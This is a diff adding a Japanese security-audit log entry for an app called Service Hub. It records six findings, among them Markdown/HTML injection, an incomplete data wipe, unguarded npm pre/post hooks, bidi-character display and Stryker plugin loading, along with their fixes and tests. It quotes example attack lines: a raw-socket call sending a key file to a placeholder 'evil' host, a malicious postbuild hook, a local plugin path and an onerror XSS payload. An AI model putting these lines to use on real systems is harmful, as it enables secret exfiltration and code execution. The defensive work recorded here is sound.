@@ -1,5 +1,56 @@
 # Service Hub — 残りの作業手順書
 
+## パス 517 (狩りの 7 回目 —— 5 面を監査役に並行で走らせ、確認した本物だけ直す) (2026-10-13)
+
+5 面 (main-ipc / renderer / network / ai / supply-chain) を監査役 (read-only・inherit/high) に並行で走らせ、**各指摘を自分で再現してから**本物だけ直した。監査役の報告は権威を持たない (permission laundering 禁止) —— esbuild で束ねて実行・ゲート関数の直接呼び・本物の fs の tmpdir・母集団の実測で 1 件ずつ確かめた。**6 件が本物**。F6 (コンシェルジュの成功返答の偽装) は再現の結果 clearedBacklog #4 と同一 (2026-10-13 に「穴なし・fold しない」と測定済み) だったので再 backlog せず。
+
+### T-022 (renderer → ai-phishing・low) —— 財務レポート (.md) の表題が利用者の事業名を素で載せ Markdown 構造を注入できた
+
+- **再現 (実測・直す前)**: `financialReport.ts:141` は `# 財務分析レポート — ${label}` と書き、`label` は利用者が打つ事業名。事業名を `<img onerror=alert(1)>` や改行 + `## 偽の見出し` にすると、書き出す `.md` にそのまま載る。この `.md` はダウンロードして人に渡る文書で、偽の見出し・表・箇条書きが立つ。
+- **なぜ census が見なかった**: `markdownExportCensus.test.ts` は financialReport を `freeText: 'none'` (= 利用者の文は通らない) と分類し、`why` に「利用者が打った文字列は 1 つも通らない」と書いていた —— **偽**で、`label` がまさに利用者の事業名だった (`none` 行は散文 `why` だけで機械検証されない家系)。
+- **直し**: `escapeMarkdownInline(label)` を通す (`\` `|` 改行 `<` を無害化)。census の行を `freeText: 'escaped'` へ移し `importsEscaper` で機械検証、件数を `{escaped:2,none:3}` → `{escaped:3,none:2}` に。`EC事業` 等の正当な表題は無害化後も 1 字も変わらない (対照済み)。
+- **回帰**: `financialReport.test.ts`「★ `<img onerror>` を含む事業名は素で載らない (&lt; へ逃がす) (threat: T-022)」(4 件) + 対照: escape を外すと生の `<` が残り落ちる。
+
+### T-023 (main-ipc → living-off-the-land・low) —— 「すべてのデータを削除」がディレクトリに化けた目標で投げ、秘密が残った
+
+- **再現 (実測・本物の fs・mkdtemp)**: `eraseAll.ts` の `eraseFileAndLitter` は `io.rm(本体)` / `io.rm(.prev 控え)` / `io.rm(litter)` を**非 recursive**で呼んでいた。`secrets.json` / その `.prev` / litter のどれかにディレクトリを化けさせ中にファイルを置くと、`rm` が `EISDIR`/`ENOTEMPTY` で投げてワイプが途中で止まり、植えたファイル (= 資格情報に化けた物) が残った。利用者が廃棄前に「全部消す」を押したのに秘密が生き残る。
+- **直し**: 3 つの `io.rm` を `{ recursive: true }` へ。**force は付けない** —— force は `ENOENT` を飲むので missing/deleted の区別 (パス 134 の契約) が壊れる。recursive はディレクトリ木ごと消し、missing の判定は維持。親ディレクトリの許可リストは採らない (`data/a/b/c/deep.md` を通す既存の設計 T-002 を壊すため)。
+- **回帰**: `eraseAll.test.ts`「★ 本体がディレクトリに化けても deleted になり、植えたファイルも残らない (threat: T-023)」(4 件・本物の fs) + missing の対照。
+
+### T-024 (supply-chain・low) —— lint:deps の lifecycle フック検出が install 系だけを数え、prebuild/postbuild が無防備
+
+- **再現 (実測)**: npm は `npm run <name>` のたびに `pre<name>`/`post<name>` を自動で走らせる。`checkOwnLifecycle` は固定の install 系キー一覧だけを見ており、`"postbuild":"node evil.cjs"` を足しても (= `npm run build` で任意コードが走る) 門が鳴らなかった。
+- **直し**: `lifecycleHooksPresent(scripts, keys)` が、明示キーに加えて scripts の全キーを走査し、`pre`/`post` を剥がした base が別の script として在れば present に足す。危ない postbuild→release 梱包の経路そのものは T-016 (medium) が別に持つ —— ここは門の列挙漏れ (defense-in-depth) を閉じる。
+- **回帰**: `installTimeCodeGuarded.test.ts`「★ script の post フックは鳴る (threat: T-024)」(4 件) + 実物の `package.json` に un-ledgered な pre/post が 0 件であること。
+
+### T-025 (renderer → ai-phishing・low) —— 村ページの AI エラーが第三者の本文を折らず双方向制御が生で出た
+
+- **再現 (実測)**: `VillagePage.tsx` は互換 API (`assistant/chat`) の失敗を `setAiError(res.message)` / `setAiError(String(e))` で受け `:377` の `⚠ … : {aiError}` に描いていた。`res.message` は第三者 (利用者が設定した互換 API の攻撃者ホスト) の本文で、web-shim の `err()`/`redactForMessage` は伏字と長さは掛けるが**改行・双方向制御 (U+202E)・不可視字は残す**。これは AI の失敗を描く最後の経路で `externalTextOnOneLine` を通していない唯一の所だった (他は AssistantPage・bestAnswers・コンシェルジュの T-005/T-020)。描画先 `:375` は `white-space: normal` なので偽の ✅ 行は立たないが、双方向制御は後続の字の見え方を入れ替えられる (Trojan Source)。
+- **直し**: 動的な (第三者の) `setAiError` 2 か所を `externalTextOnOneLine` で包む (`INVISIBLE` を `\uXXXX` へ逃がし空白を 1 つに畳む)。`setAiError(undefined)` のクリアは対象外。
+- **回帰**: `villageAiErrorFold.test.ts`「★ 動的な (第三者の) 文を渡す setAiError は externalTextOnOneLine で始まる (threat: T-025)」—— `setAiError` の呼びを走査し動的な引数は `externalTextOnOneLine(` で始まることを両方向で要求 + choke point の振る舞い + 対照 (素の `setAiError(res.message)` は落ちる)。
+
+### T-026 (supply-chain・low) —— lint:deps が stryker.config.json の「コードを選ぶ欄」を検めなかった
+
+- **再現 (実測)**: Stryker はプラグイン・ローダが `plugins`/`testRunner`/`reporters`/`checkers` 等の記述子を動的 import する (config-picks-code)。`stryker.config.json` に `plugins:["./evil.cjs"]` や `buildCommand` を足すと、週次の mutation CI (`mutation.yml`) が走る時に任意コードが実行される —— `lint:deps` はこの設定ファイルを 1 度も見ていなかった。
+- **直し**: `checkStrykerCodePicking(config)` が specFields `[testRunner, plugins, reporters, checkers, htmlReporter]` にローカル指定子 (`isLocalSpecifier`: `./` `../` `~` 絶対パス) が無いこと、`buildCommand`/`commandRunner` が無いことを検める。`readStrykerConfig` が無ければ `null` (= 検査なし)。`stryker.config.json` は全履歴 63 commit で安定資産の基準を満たさないので鎖には入れず門で形を見る (package.json 12 commit も同様 · パス 371 の判断)。
+- **回帰**: `installTimeCodeGuarded.test.ts`「★ plugins にローカルパスを入れると鳴る (threat: T-026)」(5 件・self-test 11 ケースで plugin/buildCommand/commandRunner がそれぞれ鳴る)。
+
+### T-027 (network → ssrf-and-credential-egress・medium) —— lint:network-targets の src 外の網の口が生のソケットを見ず CI から秘密を持ち出せた
+
+- **再現 (実測)**: `OUTSIDE_SEND_NAMES` は `fetch` / `https.request` 等の綴りしか見ないので、`net.connect` / `tls.connect` / `dgram.createSocket` / `http2.connect` が素通りしていた。`tools/collect.cjs` に `require('net').connect(443,'evil').end(fs.readFileSync(鍵))` を置く (ファイルの秘密の持ち出し) と **4 つの egress 門をすべて素通り**した。CI (release.yml の梱包ジョブは署名鍵 4 本と `GH_TOKEN` を env に持つ) で走る script がこれを使えば、全 egress 門を回避して秘密を外へ送れる。母集団は `git ls-files` の全木なので、ソケットの呼び方を綴りに足すだけでこの門が捕まえる (`src` の外 113 本に `.connect(`/`.createConnection(`/`.createSocket(` は 0 件なので偽陽性なし)。
+- **直し**: `RAW_SOCKET_METHODS` (`connect|createConnection|createSocket`) の `OUTSIDE_RAW_SOCKET` 正規表現を足し、`outsideSendFindings` の loop を `!OUTSIDE_SEND.test(code) && !OUTSIDE_RAW_SOCKET.test(code)` へ。文字列は loop 内で `''` に潰されるので `require('net')` は `require('')` として届く —— モジュール名は見分けられないがソケットの呼び方そのものを鳴らす。real gate は exit 0 (偽陽性 0)。
+- **回帰**: `networkTargetWitness.test.ts`「★ 陽性 (threat: T-027): %s を拾う」(証人 8 ケース・陽性 5 / 陰性 3) + self-test 6 ケース + **対照**: wire-up の raw-socket 枝を外すと 5 件が 0 件になる (= 針が死んでいる・確認済)。
+
+### F6 (ai) —— 投資しない: コンシェルジュの成功返答の偽装
+
+- 監査役の ai 指摘「`ChatbotWidget:463` の `🧠 ${llm.reply}` が畳まれず `✅ 実行しました` を偽装できる」を再現。実測: `{m.text}` は素のテキスト (`parseMarkdown` を通らない)・`.concierge-msg` は `white-space: pre-wrap` なので改行は見えるが、markdown/HTML/アプリ構造の注入は無く、`🧠` の接頭辞 + `🪪 via <host>` の札が返答をモデル出力として囲む。**これは clearedBacklog #4「ブラウザ版コンシェルジュが Ollama の返答を externalTextOnOneLine で畳むべきか」と同一**で、2026-10-13 に「穴なし・fold しない (1 行に畳むと正当な複数行の回答を潰す UX 退行)」と測定済み。自分の測定済みの結論と矛盾させないため、再 backlog しない。
+
+### 検証
+
+- `typecheck` 緑・`npm test` exit 0・`verify:all` exit 0 (ユニット数 17647 → **17668**)・`chain:verify` 緑 (block **#291** —— `eraseAll.ts` は保護対象)。脅威 20 → **26** (T-004 欠番)。
+- 出荷コードが動いた (`financialReport.ts` / `VillagePage.tsx` renderer・`eraseAll.ts` main) ので実機も回した —— FULL **11,875,116 B** / LITE **3,287,740 B**。`perf` OK (LITE DCL 293ms / heap 9.7MB・FULL DCL 722ms / heap 36.2MB)・`e2e` **758 件 ❌ 0**・`e2e:lite` **758 件 ❌ 0**。
+- **確立したパターン** —— **監査役の報告は権威を持たない。esbuild の束・ゲート関数の直接呼び・本物の fs・母集団の実測で 1 件ずつ再現してから直す。** **第三者の文を画面へ出す最後の経路を 1 つ直したら兄弟を全部数える** (AssistantPage / bestAnswers / コンシェルジュは畳んでいたのに村ページだけ残っていた)。**門の走査母集団・列挙は綴りや固定キーで決めず、実物の形 (git ls-files の全木・scripts の全キー・ソケットの呼び方) に聞く** (fetch だけ見て生ソケットを漏らす・install 系だけ見て postbuild を漏らす)。**破壊的なファイル操作 (ワイプ) は、目標が別の形 (ディレクトリ) に化けても完遂する。**
+
 ## パス 516 (狩りの 6 回目 —— 5 面を監査役に並行で走らせ、確認した本物だけ直す) (2026-10-13)
 
 5 面 (main-ipc / renderer / network / ai / supply-chain) を監査役 (read-only・high) に並行で走らせ、**指摘を自分で再現してから**本物だけ直した。報告は main-ipc / renderer / ai = 0 件 (measured-healthy)、network = 新規 LOW 1 件、supply-chain = 新規 MEDIUM 1 件。ai 面は監査役を待つ間に自分で `ChatbotWidget` の invoke 失敗経路を読んで 1 件見つけた。再現で **3 件とも本物**と確認。
